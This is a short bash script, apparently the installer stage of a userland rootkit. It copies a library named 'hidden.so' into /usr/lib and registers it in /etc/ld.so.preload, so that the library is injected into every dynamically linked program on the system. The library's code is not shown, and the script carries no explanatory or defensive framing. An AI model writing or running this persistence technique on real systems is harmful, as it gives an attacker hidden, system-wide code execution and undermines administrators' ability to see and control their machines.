#!/bin/bash

cp ./hidden.so /usr/lib
echo "/usr/lib/hidden.so" > /etc/ld.so.preload
